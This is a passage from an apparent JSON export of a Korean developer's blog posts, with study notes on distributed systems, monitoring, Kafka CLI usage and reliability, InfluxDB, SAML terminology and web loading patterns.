때문에 소프트 삭제 없이 삭제 이벤트로 변환 데이터 저장소 성능에 미치는 영향 최소화 : 선행기입로그를 사용하는 데이터 저장소에는 성능에 별 영향없이 CDC(change data capture) 작업 수행 가능 저지연 업데이트(low-latency updates) : 이벤트가 선행 기입 로그, 바이너리 로그에 기록되면 곧바로 업데이트를 전파할 수 있으므로 다른 데이터 해방 패턴보다 지연시간이 짧음 단점 내부 데이터 모델 노출 : 내부 데이터 모델이 체인지로그에 완전히 노출되기 때문에 신중하게 선별해 격리해야 함 데이터 저장소 외부에서 반정규화 : 테이블 기반","categories":[],"tags":[]},{"title":"distributed-architecture-article-01","slug":"distributed-architecture-article-01","date":"2021-05-25T04:12:29.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/05/25/distributed-architecture-article-01/","link":"","permalink":"https://blog.devkwang.app/2021/05/25/distributed-architecture-article-01/","excerpt":"","text":"분산 컴퓨팅의 여덟가지 오류 네트워크는 안정적이다. 지연 시간은 0이다. 대역폭은 무한하다. 네트워크에는 보안성이 있다. 토폴로지는 변경되지 않는다. 관리자는 한 명이다. 전송 비용은 0이다. 네트워크는 동질적이다. https://queue.acm.org/detail.cfm?id=2499552 http://techblog.netflix.com/2011/07/netflix-simian-army.html 시스템의 디자인은 가능한 한 사람의 작용을 줄이는 방식으로 디자인돼야 하며, 개발에서 배포까지 모든 것이 자동화 돼야 한다. 서비스를 제거하고 재부팅 -&gt; 핵심 전략은 서버 시작시간을 빠르면 몇 밀리초 정도로 빠르게 하는것이다. 애플리케이션은 SLA에 뒤쳐지면서 실행 중이라는 사실을 알 때 부하는 내려 놓아야 한다. 관찰 가능성 시스템 내부 상태를 외부 출력에 대한 지식으로 추측하는 척도이다. 각 마이크로서비스의 처리량, 성공/실패한 요청의 수, CPU/메모리/기타 네트워크 리소스의 활용률 비지니스 관련 메트릭 무공유 아키텍처 분산 컴퓨팅에서 잘 정립된 원칙 특정 노드가 단순한 무상태를 넘어 디스크 또는 메모리를 다른 노드와 공유하면 안된다. 확장 가능한 시스템은 더 많은 노드 또는 리소스가 시스템에 도입될 때 로드 증가에 따라 처리량을 증가 시킬 수 있어야 한다. 로그는 이벤트 스트림으로 처리해야 한다. 원격 측정 Application Performance monitoring HTTP 요청 수 데이터베이스 호출 수 각 요청을 처리하는데 걸린 시간 도메인 특화 새 주문 수 미결 주문 마감 주문을 날짜별로 포함해서 처리 중인 주문과 관련된 데이터 푸시 상태 및 시스템 로그는 서버시작, 종료 메모리 소비 및 CPU 사용률","categories":[],"tags":[]},{"title":"monitoring-prometheus","slug":"monitoring-prometheus","date":"2021-05-20T01:30:57.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/05/20/monitoring-prometheus/","link":"","permalink":"https://blog.devkwang.app/2021/05/20/monitoring-prometheus/","excerpt":"","text":"Prometheus Metric 기반 오픈소스 모니터링 시스템 데이터 모델 : Label (key-value time series) 쿼리 언어 CNCF 재단 멤버 Integration Library를 통해 third-party App들 연계 가능 알람 기능 모니터링이란 Alerting(알림) : 문제가 발생한 시기나 시점을 파악하는 것이 모니터링에서는 가장 중요하다. Debugging(디버깅) : 문제의 근본 원인을 규명하고 문제가 무엇이든 간에 반드시 해결해야 한다. Trending(추세 파악) : 시스템이 어떻게 사용되고 시간에 따라 변화하는지를 확인할 수 있는 기능. Capacity Planning 과 같은 설계 결정과 프로세스에 영향을 미칠 수 있다. Plumbing(플러밍) : 망치를 가지고 있으면, 모든 것이 못처럼 보이기 시작한다. 데이터 처리 파이프라인으로 모니터링의 범주 HTTP 요청 수신 HTTP 400 응답 송신 entering a function (함수 시작) leaving a function (함수 종료) if 문의 else에 도달 사용자 로그인 디스크에 데이터 쓰기 네트워크에서 데이터 읽기 커널에 추가 메모리 요청 모든 이벤트에는 컨텍스트가 있다. HTTP 요청에는 들어오고 나가는 IP주소, 요청 URL 설정된 쿠키, 요청한 사용자 정보가 포함되어있다. HTTP 응답에는 응답에 걸린 시간, HTTP 상태 코드, 응답 본문의 길이가 있다. 함수를 포함하는 이벤트에는 함수 상단에 있는 함수들의 콜 스택과 HTTP 요청처럼 무엇이 해당 스택의 일부를 트리거 했는지에 대한 정보가 담겨있다. 프로파일링 profiling (프로파일링)은 우리가 모든 시간에 대해 모든 이벤트의 컨텍스트를 가질 수 없지만, 제한된 기간의 일부 컨텍스트를 가질 수 있다는 방식으로 접근한다. Tcpdump는 프로파일링 도구의 하나로, 지정된 필터를 기반으로 네트워크 트래픽을 기록할 수 있다. Tcpdump는 필수적인 디버깅 도구지만, 실제로는 디스크 공간이 부족해 질수 있다. 리눅스 커널의 eBPF(enhanced Berkeley Packet Filters)는 파일시스템부터 네트워크 기호까지 커널 이벤트에 대해 상세하게 프로파일링을 할 수 있다. 오랜 시간 동안 프로프알링을 해야하는 경우, 다른 모니터링 방법과 함께 사용하려면 반드시 데이터의 양을 줄여야 한다. 트레이싱 tracing(트레이싱)은 모든 이벤트를 살펴보는 것이 아니라, 관심 기능을 통과하는 일부 이벤트 처럼 수백 개의 이벤트 중 특정 이벤트에만 집중한다. Stack Trace에서 관심 있는 부분의 함수들을 기록하고, 때때로 이러한 함수들이 얼마나 오랫동안 수행되었는지도 기록한다. 트레이싱 시스템 중 일부는 관심 지정에서 스택 트레이스에 스냅샷을 수집하는 대신 관심 있는 함수 하위의 모든 함수 호출을 추적하고 타이밍을 기록한다. HTTP 요청 중 하나를 샘플링할 수 있고, 이 요청에 대해 데이터베이스나 캐시같은 백엔드와 통신하는 데 얼마나 오랜 시간이 소비되었는지 확인할 수 있다. Distributed tracing(분산 트레이싱)은 한단계 더 나아가 원격 프로시저 호출에서 다른 프로세스로 전달되는 요청에 고유 ID 를 추가해 해당 요청이 추적되어야 하는지 여부등 프로세스 전반에 걸친 작업을 추적한다. 트레이싱에서 데이터 볼륭 유지 및 계측 성능에 영향을 미치는 것은 sampling(샘플링)이다. 로깅 logging은 제한된 이벤트 집합을 살펴보고 각 이벤트에 대한 컨텍스트 일부를 기록한다. 로깅의 장점은 이벤트에 대한 샘플링이 없다는 점이다. 따라서 필드 개수를 제한하더라도, 시간이 오래 걸리는 요청이 특정 API 엔드포인트와 통신하는 특정 유저에게 얼마나 영향을 미치는지를 판단해야 한다. 로깅의 범주 Transaction Logs(트랜잭션 로그) : 어떠한 대가를 치르더라도 영원히 안전하게 보관해야 하는 중요한 비지니스 기록이다. 주로 비용과 연관된 기능이나 사용자가 직접 사용하는 주요 기능이 트랜잭션 로그에 속한다. Request logs(요청 로그) : 모든 HTTP 요청이나 데이터베이스 호출을 track(추적)하는 경우의 로그다. 요청 로그는 사용자가 직접 사용하는 기능이나 내부 최적화의 구현에 쓰인다. 대부분은 요청 로그가 삭제되는 것을 바라지 않겠지만, 그렇다고 로그 중 일부를 잃는다고 해서 큰 문제가 되진 않는다. Application Logs(애플리케이션 로그) : 모든 로그가 요청 로그인 것은 아니며, 프로세스 그 자체에 관한 로그도 있다. 시작 메시지, 백그라운드 유지보수 작업, 프로세스 수준의 로그 주로 사람들이 직접 읽기 때문에 정상적인 동작에서 1분당 몇 개 정도가 적절하다. Debug Logs(디버그 로그) : 디버그 로그는 굉장히 상세해서 생성과 저장에 비용이 많이 든다. 협소한 디버깅 상황에서만 사용되며, 데이터의 양 때문에 프로파일링의 특성을 띈다. 메트릭 metric(메트릭)은 컨텍스트를 대부분 무시하고 다양한 유형의 이벤트에 대해 시간에 따른 aggregation(집계)을 추적한다. 자원 사용을 정상적으로 유지하려면, 추적하는 메트릭의 개수를 제한해야한다. 프로세스당 1만개의 메트릭 처리정도가 합리적인 상한선 일 것이다. metric을 이용하면 애플리케이션의 각 서브시스템에서의 대기 시간과 처리하는 데이터양을 추적해서 성능 저하의 원인이 정확히 무엇인지 손쉽게 알아낼 수 있다. 어떤 서브시스템에 문제의 원인이 있는지 찾아낸 다음, 로그를 통해 해당 문제에 관련된 사용자 요청을 정확하게 파악할 수 있다. 메트릭은 프로세스 전반에 걸쳐 이벤트 정보를 수집할 수 있지만, 일반적으로 카디널리티가 제한된 컨텍스트는 1~2개 이상의 필드를 갖지 않는다. 로그는 한 가지 유형 이벤트에 대해 모든 정보를 수집할 수 있지만, 카디널리티가 제한되지 않은 컨텍스트에 대해 수백 개 필드만 추적할 수 있다.","categories":[],"tags":[{"name":"monitoring","slug":"monitoring","permalink":"https://blog.devkwang.app/tags/monitoring/"},{"name":"prometheus","slug":"prometheus","permalink":"https://blog.devkwang.app/tags/prometheus/"}]},{"title":"exchange-ready-april","slug":"exchange-ready-april","date":"2021-04-13T02:30:48.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/04/13/exchange-ready-april/","link":"","permalink":"https://blog.devkwang.app/2021/04/13/exchange-ready-april/","excerpt":"","text":"철이 없었죠… Front-End 를 우습게 봤다는게 Front-end 역습 Front-end Project 어떻게 시작하나? ## Jquery를 썼다는건 Browser를 이해하면 Front-end가 보인다. Dom Tree, CSS OM Layout, Painting javascript로 화면을 조작을 하면, Reflow와 Repainting이 일어나서 성능이 저하된다 –&gt; 그래서 사람들이 Vue를 제어할때 onReady Event에 모아서 한번에 처리했었다. SSR에서 SPA가 나온 이유 정적 리소스 다운로드에 대한 비용 Ajax의 등장 패러다임 시프트가 일어나 Client Side Rendering 으로 전환 Client가 무거워짐 이를 잘 관리하기 위해 Framework들이 등장 Programming Model이 복잡해짐 view - data bind 양방향 선택 특정상황에서 느려짐 이러한 부분에 대한것을 해결하기 위해 Virtual DOM을 쓰는 React의 등장 Flux Architecture 등장 React 와 VueJS 등장 SPA --&gt; SSR로 다시 SEO Meta Tag들 Static Page Generator 예전에 좋았는데 왜 지금 안좋아지는가? HTTP2 Image Sprite Protocol HTTP 추가로 알면 좋은 것들 etc)","categories":[],"tags":[]},{"title":"designing-data-intensive-application-9","slug":"designing-data-intensive-application-9","date":"2021-03-29T00:09:02.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/03/29/designing-data-intensive-application-9/","link":"","permalink":"https://blog.devkwang.app/2021/03/29/designing-data-intensive-application-9/","excerpt":"","text":"데이터 일관성과 합의 분산 시스템에서는 내부 구성 요소 중 뭔가에 결함이 있더라도 서비스는 올바르게 동작할 방법을 찾아야 한다. 내결합성을 지닌 시스템을 구축하는 가장 좋은 방법은 유용한 보장을 해주는 범용 추상화를 찾아 이를 구현하고 애플리케이션에서 이 보장에 의존하게 하는 것이다. 분산 시스템에 가장 중요한 추상화 중 하나는 합의, 즉 모든 노드가 어떤 것에 동의하게 만드는 것이다. 일관성 보장 복제 데이터베이스는 대부분 최소한 최종적 일관성을 제공한다. (쓰기를 멈추고 불특정 시간 동안 기다리면 결국 모든 읽기 요청이 같은 값을 반환한다는 뜻이다.) 불일치는 일시적이며 결국 스스로 해소한다. 모든 복제본이 결국 같은 값으로 수렴되기를 기대하므로 최종적 일관성보다 수렴이 더 나은 이름일지도 모른다. 그러나 언제 복제본이 수렴될지에 대해서는 아무것도 이야기 하지 않는다. 최종적 일관성은 보통 단일 스레드 프로그램에 있는 변수 동작과 매우 다르므로 애플리케이션 개발자는 주의를 요한다. 선형성 최종적 일관성을 지닌 데이터베이스에서 두 개의 다른 복제본에 같은 질문을 동시에 하면 두 가지 다른 응답을 받을지도 모른다. 데이터 베이스가 본제본이 하나만 있다는 환상을 만들어 준다면 훨씬 더 단순 해지지 않을까? 그러면 모든 클라이언트는 똑같은 데이터를 보고 복제 지연을 걱정할 필요가 없다. 위의 아이디어가 선형성을 뒷받침하는 아이디어다. atomic consistency (원자적 일관성) strong consistency (강한 일관성) immediate consistency (즉각 일관성) external consistency (외부 일관성) recency guarantee(최신성 보장) : 최근에 갱신된 값이며 뒤처진 캐시나 복제본에서 나온 값이 아니라고 보장 밥과 앨리스는 서로 다른 결과를 본다 (선형성 위반) 시스템에 선형성을 부여하는 것은 무엇인가? 선형 데이터베이스에서 동시에 같은 키 x를 읽고 쓰는 세 클라이언트를 보여준다. 분산 시스템 분야에서 x는 register(레지스터)라고 불린다. 현실에서는 키-값 저장소의 키 하나, 관계형 데이터베이스의 로우 하나, 또는 문서 데이터베이스의 문서 하나가 될 수 있다. 이 예제에서 레지스터는 두 가지 종류 연산이 있다. read(x) =&gt; v는 클라이언트가 레지스터 x의 값을 읽기를 요청했고 데이터베이스가 값 v를 반환했다는 것을 의미한다. write(x) =&gt; v은 클라이언트가 레지스터 x의 값을 v로 설정하라고 요청했고 데이터베이스가 응답r(ok or error)을 반환했다는 것을 의미한다. 실행되는 동안 클라이언트 A와 B는 최신 값을 읽기 위해 반복적으로 데이터베이스를 폴링한다. A와 B는 자신의 읽기 요청에 대해 어떤 응답을 받을 수 있을까? A의 첫 연산은 0을 반환하는 것이 명백하다 A의 마지막 읽기 연산은 쓰기가 완료된 후 시작하므로 데이터베이스가 선형적이라면 명백히 새로운 값 1을 반환해야 한다. 쓰기는 쓰기 연산의 시작과 끝 사이의 어느 시점에선가 처리됐어야 하고 읽기는 읽기 연산의 시작과 끝 사이의 어느 시점에선가 처리 됐어야 한다. 만약 쓰기가 끝난 후에 읽기가 시작하면 그 읽기는 쓰기 후에 처리됐어야 하고 따라서 새로 쓰여진 값을 볼 수 있어야 한다. 쓰기 연산과 시간이 겹치는 읽기 연산은 0을 반환했을 수도 1을 반환했을 수도 있다. 읽기 연산이 처리되는 시점에 쓰기의 영향이 발생했는지 아닌지 알 수 없기 때문이다. 이 연산들은 쓰기와 동시에 실행된다. 시스템을 선형적으로 만들려면 또 다른 제약조건을 추가해야 한다. 선형성 시스템에서 우리는 x의 값이 원자적으로 0에서 1로 바뀌는 어떤 시점이 있어야 한다고 상상한다. 따라서 한 클라이언트의 읽기가 새로운 값 1을 반환하면 이후의 모든 읽기 또한 새로운 값을 반환해야 한다. A는 새로운 값 1을 읽은 첫번째 클라이언트다. A의 읽기가 반환된 후 바로 B가 새로운 읽기를 시작한다. B의 읽기는 확실히 A의 읽기 뒤에 실행되므로 C가 실행한 쓰기가 아직 진행 중이라도 역시 1을 반환해야 한다. 하나의 연산을 더 추가한다. cas(x, v_old, v_new) =&gt; r 은 클라이언트가 atomic compare-and-set 연산을 요청했다는 뜻이다. 레지스터 x의 현재 값이 v_old와 같으면 원자적으로 v_new로 설정돼야 한다. X != v_old 라면 이 연산은 레지스터를 그대로 두고 오류를 반환해야 한다. r(ok or error)은 데이터베이스의 응답이다. 클라이언트 B가 X 읽기 요청을 보낸 후 클라이언트 D가 x를 0으로 설정하는 요청을 보내고 클라이언트 A가 x를 1로 설정하는 요청을 보낸다. 그렇지만 B의 읽기가 반환한 값은 1이다. 이것은 문제가 없으며 데이터베이스가 D의 쓰기를 먼저 처리한 수 A의 쓰기를 처리했고 마지막으로 B의 읽기를 처리했다는 의미다. 요청을 보낸 순서와는 다르지만 세 요청이 동시적이기 때문에 이는 허용된다. 클라이언트 B의 읽기는 클라이언트 A가 데이터베이스로부터 값을 1로 쓰는 데 성공했다는 응답을 받기 전에 1을 반환했다. 이것도 괜찮다. 값이 쓰여지기 전에 읽혔다는 의미가 아니라 데이터베이스에서 클라이언트 A로 가는 ok응답이 네트워크에서 약간 지연됐다는 의미이다. 이 모델은 어떤 트랜잭션 격리도 가정하지 않는다. 다른 클라이언트가 언제라도 값을 바꿀지 모른다. 예를 들어 C는 먼저 1을 읽고 그 다음에는 2를 읽었는데, 두 번의 읽기 사이에 B가 값을 변경했기 때문이다. 다른 클라이언트가 동시에 값을 바꾸지 않았는지 확인하기 위해 atomic compare and set 연산을 쓸 수 있다. B와 C의 cas 요청은 성공하지만 D의 cas 요청은 실패다 (데이터베이스가 그 요청을 처리하는 시점에 x의 값은 더 이상 0이 아니다.) 클라이언트 B의 마지막 읽기는 선형적이지 않다. 이 연산은 x를 2에서 4로 갱신하는 C의 cas 쓰기와 동시적이다. 다른 요청이 없다면 B의 읽기가 2를 반환해도 괜찮다. 그러나 클라이언트 A는 B의 읽기가 시작하기 전에 이미 새로운 값 4를 읽었다. 따라서 B는 A가 읽은 것보다 과거의 값을 읽는 것은 허용되지 않는다. 선형성 대 직렬성 직렬성 모든 트랜잭션이 여러 객체(로우, 문서, 레코드)를 읽고 쓸 수 있는 상황에서의 트랜잭션들의 격리 속성이다. 직렬성은 트랜잭션이 어떤 순서에 따라 실행되는 것처럼 동작하도록 보장해준다. 그 순서가 트랜잭션들이 실제로 실행되는 순서와 달라도 상관없다. 선형성 레지스터(개볍 객체)에 실행되는 읽기와 쓰기에 대한 최신성 보장이다. 선형성은 연산을 트랜잭션으로 묶지 않아서 충돌 구체와 같은 부가적인 수단을 사용하지 않으면 쓰기 스큐 같은 문제를 막지 못한다. 데이터베이스는 직렬성과 선형성을 모두 제공할 수도 있으며 이런 조합은 strict serializability (엄격한 직렬성)이나 strong one-copy serializability, strong-1SR(강한 단일 복사본 직렬성)이라고 한다. 2단계 잠금(2PL)이나 실제적인 직렬실행을 기반으로 한 직렬성 구현은 보통 선형적이다. 그러나 직렬성 스냅숏 격리(SSI)는 선형적이지 않다. SSI 는 읽는 쪽이나 쓰는 쪽 사이의 잠금 경쟁을 피하기 위해 일관된 스냅숏에서 읽는다. 요점은 스냅숏에 스냅숏보다 나중에 실행된 쓰기를 포함하지 않는다는 것이고 따라서 스냅숏에서 읽으면 선형적이지 않다.","categories":[],"tags":[]},{"title":"byzantine-generals-problem","slug":"byzantine-generals-problem","date":"2021-03-24T00:52:40.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/03/24/byzantine-generals-problem/","link":"","permalink":"https://blog.devkwang.app/2021/03/24/byzantine-generals-problem/","excerpt":"","text":"비잔틴 장군 문제 이른바 두 장군 문제(Two Generals Problem)을 일반화한 것이다. 이 문제에서는 두 군대의 장군이 전투 계획에 동의해야 하는 상황을 가정한다. 이들은 다른 두 장소에 캠프를 세우기 때문에 전령을 통해서만 연락을 주고받을 수 있고 전령은 때때로 (네트워크의 패킷처럼) 늦거나 실종되기도 한다. 비잔틴 버전 문제에서는 n명의 장군이 동의해야 하며 그들의 노력은 그들 가운데 배신자들이 있다는 사실에 방해를 받는다. 장군들은 대부분 충성스럽고 따라서 진실한 메세지를 보내지만 배신자들은 (발각되지 않으려고 노력하며) 가짜나 허위 메세지를 보내 다른 장군들을 속이거나 혼란스럽게 하려고 시도할지도 모른다. 누가 배신자인지는 미리 알려지지 않는다. Byzantium(비잔티움)은 고대 그리스 도시였으며 나중에 콘스탄티노플이 됐다. 현재는 터키의 이스탄불이다. 비잔티움의 장군들이 다른 곳의 장군들보다 모의나 음모를 더 꾸민다는 어떤 역사적 증거도 없다. 그보다는 심하게 복잡하고 관료주의적이며 정직하지 못하다는 뜻에서 비잔틴으로부터 이름이 유래됐으며 컴퓨터가 나오기 오래 전에 정치에서 사용됐다. Lamport(램포트)는 어떤 독자도 불쾌하지 않을 국적을 고르기를 원했고 The Albanian Generals Problem(알바니아 장군 문제)라고 부르는 것은 그리 좋은 생각이 아니라는 조언을 들었다.","categories":[],"tags":[]},{"title":"time-series-data-base-key-concept","slug":"time-series-data-base-key-concept","date":"2021-02-15T09:11:00.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2021/02/15/time-series-data-base-key-concept/","link":"","permalink":"https://blog.devkwang.app/2021/02/15/time-series-data-base-key-concept/","excerpt":"","text":"Time-ordered Data 성능 향상을 위해 데이터는 시간 오름차순으로 기록된다. Strict update and delete permissions 질의, 쓰기 성능 향상을 위해 update와 delete 를 엄격히 제한한다. 시계열 데이터는 주로 업데이트 되지 않는 새로운 데이터이기 때문이다. 삭제는 일반적으로 기록되지 않는 데이터에만 영향을 미치며 update와 충돌은 일어나지 않는다. Handle read and write queries first 일관성 보다는 읽기 및 쓰기 요청의 우선순위를 지정한다. 쿼리가 실행될 때의 결과를 반환하기 때문에 쿼리 된 데이터에 영향을 주는 모든 트랜잭션은 이후에 처리 되어 데이터가 궁극적으로 일관성을 유지하도록 한다. 수집속도가 높으면 쿼리 결과에 최신 데이터가 포함되지 않을 수 있다. Schemaless design 스키마없는 디자인을 사용해 불연속 데이터를 더 잘 관리하도록 한다. 시계열 데이터는 일시적이므로 데이터가 몇시간동안 표시되었다가 사라진다. Datasets over individual points 데이터 세트가 개별 포인트보다 더 중요하기 때문에 influxDB는 데이터를 집계하고 대규모 데이터 세트를 처리하는 강력한 도구를 구현한다. 포인트는 타임 스탬프 및 시리즈로 구분되므로 전통적인 의미의 ID가 존재하지 않는다. Duplicate data 충돌 해결을 단순화하고 쓰기 성능을 높이기 위해 influxDB는 여러번 전송된 데이터가 중복데이터라고 가정합니다. 동일한 포인트는 두번 저장되지 않습니다. 포인트에 대한 새 필드 값이 제출되면 influxDB는 가장 최근 필드값으로 포인트를 업데이트 합니다. 드문 경우지만 데이터를 덮어 쓸 수 있다.","categories":[],"tags":[{"name":"tsdb","slug":"tsdb","permalink":"https://blog.devkwang.app/tags/tsdb/"},{"name":"influxdb","slug":"influxdb","permalink":"https://blog.devkwang.app/tags/influxdb/"}]},{"title":"kafka-cli-cheat-sheet","slug":"kafka-cli-cheat-sheet","date":"2021-02-14T09:35:02.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/02/14/kafka-cli-cheat-sheet/","link":"","permalink":"https://blog.devkwang.app/2021/02/14/kafka-cli-cheat-sheet/","excerpt":"","text":"Daemon으로 kafka 실행 12./bin/zookeeper-server-start.sh -daemon config/zookeeper.properties./bin/kafka-server-start.sh -daemon config/server.properties Topic 생성 1./bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor 1 --partitions 1 --topic notification-topic Message Publish 1./bin/kafka-console-producer.sh --broker-list localhost:9092 --topic notification-topic produce messages to a kafka topic from a file 1./bin/kafka-console-producer.sh --broker-list localhost:9092 --topic notification-topic &lt; topic-input.txt Produce messages to Kafka with both key and value 1./bin/kafka-console-producer.sh --broker-list localhost:9092 --topic notification-topic --property parse.key=true --property key.separator=:","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://blog.devkwang.app/tags/kafka/"}]},{"title":"spring-boot-application-runner","slug":"spring-boot-application-runner","date":"2021-01-29T01:41:35.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/01/29/spring-boot-application-runner/","link":"","permalink":"https://blog.devkwang.app/2021/01/29/spring-boot-application-runner/","excerpt":"","text":"CommandLineRunner 실행되는 코드가 자바 문자열 아규먼트 배열에 접근해야 할 필요가 있는 경우에 사용. CommandLineRunner 인터페이스를 구현한 클래스에 @Component 어노테이션을 선언해두고 컴포넌트 스캔 이후 구동 시점에 run 메소드 실행 ApplicationRunner 실행되는 코드가 아규먼트에 접근하고 싶으나 추상화된 ApplicationArguments 타입의 객체를 받고 싶을 때 사용 CommandLineRunner 인터페이스를 구현한 클래스에 @Component 어노테이션을 선언해두고 컴포넌트 스캔 이후 구동 시점에 run 메소드 실행","categories":[],"tags":[{"name":"springboot","slug":"springboot","permalink":"https://blog.devkwang.app/tags/springboot/"}]},{"title":"kafka-definition-guide-6","slug":"kafka-definition-guide-6","date":"2021-01-28T04:22:16.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/01/28/kafka-definition-guide-6/","link":"","permalink":"https://blog.devkwang.app/2021/01/28/kafka-definition-guide-6/","excerpt":"","text":"신뢰성 있는 시스템에서 프로듀서 사용하기 시나리오 1 replica 3, unclean leader election, producer ack 1 프로듀서가 메세지를 전송하면 리더에 쓰게 되지만 동기화 리플리카에는 아직 쓰지 않은 상황 리더는 프로듀서에게 ‘메세지를 성공적으로 썼음’ 응답 후 데이터가 다른 리플리카에 복제되기 전에 곧바로 중단 이 경우 in-sync replica로 간주된 하나의 replica 가 리더가 됨 메세지는 새로 리더가 된 리플리카에 쓰지 않았으므로 유실 시나리오 2 replica 3, unclean leader election, producer ack all 쓰려고 하는데 해당 파티션의 리더가 방금 중단되어 새로운 리더 선출 중 카프카는 ‘사용할 수 있는 리더가 없음’ 에러 응답 쓰기가 성공적으로 될 때까지 프로듀서가 해당 에러를 제대로 처리하지 못해 재시도 하지 않는 다면 메세지 유실 신뢰성 요구 사항에 맞도록 acks 구성 매개변수를 올바르게 설정해야 한다. 구성 매개변수와 코드 모두에서 에러 처리를 올바르게 해야 한다. 확인 응답 전송 acks = 0 : 프로듀서가 네트어ㅜ크로 메세지를 전송했다면 카프카가 성공적으로 쓴 것으로 간주 전송하는 개체가 직렬화 될 수 없거나, 네트워크 카드 장애가 생기면 프로듀서가 에러를 받음 그러나 메세지를 쓸 파티ㅕㅅㄴ이 오프라인이거나 관련 카프카 클러스터의 처리가 늦어지는 경우는 에러를 받지 않음. 이에 리더 선출이 예상되는 상황의 메세지는 유실될 가능성 존재 acks = 1 : 리더가 메시지를 수신하고 파티션 데이터 파일에 쓴 후 확인 응답 또는 에러를 전송한다. 리더 선출 중일 경우 프로듀서는 LeaderNotAvailable Exception 예외 발생 프로듀서가 이 예외를 올바르게 처리한다면 해당 메세지를 다시 전송하여 새로운 리더가 수신하게 됨","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://blog.devkwang.app/tags/kafka/"}]},{"title":"kafka-definition-guide-1","slug":"kafka-definition-guide-1","date":"2021-01-18T05:46:55.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/01/18/kafka-definition-guide-1/","link":"","permalink":"https://blog.devkwang.app/2021/01/18/kafka-definition-guide-1/","excerpt":"","text":"Keyword page cache : 카프카는 프로듀서에게 빠른 응답 시간을 제공하기 위해 디스크 입출력 성능에 의존한다. !! dirty memory page swap space vm.swappiness : 이 매개변수의 값은 비율이며, 페이지 캐시의 페이지들을 삭제하지 않고 스와핑 공간을 얼마나 사용할지 나타낸다. linux file system EXT4 XFS File Metadata ctime : 생성 시간 mtime : 마지막 수정 시간 atime : 마지막 사용 시간","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://blog.devkwang.app/tags/kafka/"}]},{"title":"authentication-saml","slug":"authentication-saml","date":"2021-01-05T05:17:04.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/01/05/authentication-saml/","link":"","permalink":"https://blog.devkwang.app/2021/01/05/authentication-saml/","excerpt":"","text":"SAML (Security Assertion Markup Language) 용어 Authentication(인증) : 사용자가 자신이 주장하는 사람임을 확인 Authorization(권한 부여) : 사용자가 특정 시스템이나 콘텐츠에 접속할 수 있는 권한이 있는지 확인 Service Provider(서비스 제공자) : 시스템에서 사용자가 원하는 서비스를 제공하는 제공자 Identity Provider(인증 정보 제공자) : 사용자의 크레덴셜(사용자 ID와 패스워드)을 인증하고 SAML Assertion을 발행하는 주체 SAML Assertion(SAML 보안 정보) : 사용자 인증을 위해 Identity Provider로 부터 Service Provider로 전달되는 보안정보 사용자명, 권한 등의 내용을 적은 XML 문서로 변조를 막기 위해 전자 서명 되어있다. SAML Request (인증 요청) : Service Provider가 생성ㅁ하는 인증 요청으로 Identity Provider로 인증 위임 Circle of Trust : 하나의 Identity Provider를 공유하는 Service Provider 들로 구성 Metadata : SSO를 활성화 하는 Service Provider 및 Identity Provider가 생성하는 XML 파일 웹 어플리케이션의 경우 프로비저닝시에 Service Provider와 Identity Provider간 메타데이터(Entity Id, 암호화 키, Endpoint)의 교환으로 신뢰 관계 설립 Assertion Consumer Service URL : Identity Provider가 특정 URL로 최종 SAML 응답을 포스트 하도록 요구한다.","categories":[],"tags":[]},{"title":"java-date-timestamp","slug":"java-date-timestamp","date":"2021-01-05T02:19:29.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/01/05/java-date-timestamp/","link":"","permalink":"https://blog.devkwang.app/2021/01/05/java-date-timestamp/","excerpt":"","text":"Java 8 이전 java.sql.Date java.sql","categories":[],"tags":[]},{"title":"web-import-on-interaction-pattern","slug":"web-import-on-interaction-pattern","date":"2020-12-15T02:13:55.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2020/12/15/web-import-on-interaction-pattern/","link":"","permalink":"https://blog.devkwang.app/2020/12/15/web-import-on-interaction-pattern/","excerpt":"","text":"The Import on interaction pattern user-centric performance metrics for measuring First Input Delay : FID : within 100ms how fast your site loads can be measured with First Contentful Paint : FCP the render time of the largest image or text block visible within the viewport Largest Contentful Paint: LCP Total Blocking Time : TBT Total to Interactive : TTI The different ways to load resources are, at a high-level Eager - load resource right away (the normal way of loading scripts) Lazy (Route-based) - load when a user navigates to a route or component Lazy (On interaction) - load when the user clicks UI (e.g Show Chat) Lazy (In viewport) - load when the user scrolls towards the component Prefetch - load prior to needed, but after critical resources are loaded Preload - eagerly, with a greater level of urgency","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://blog.devkwang.app/tags/web/"},{"name":"security","slug":"security","permalink":"https://blog.devkwang.app/tags/security/"}]},{"title":"new-house-interior","slug":"new-house-interior","date":"2020-11-01T23:38:33.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/11/02/new-house-interior/","link":"","permalink":"https://blog.devkwang.app/2020/11/02/new-house-interior/","excerpt":"","text":"단창, 이중창, 발코니 전용창 창호 업체 종류 LG ,KCC, 한화, 이건, 영림 Low-Emissivity 유리 https://brunch.co.kr/@jhsiwo/111 복층유리 두께 : 16T, 18T, 22T, 24T https://m.blog.naver.com/nanumwin/221177795208 https://m.blog.naver.com/sashsuridotcom/220835029218 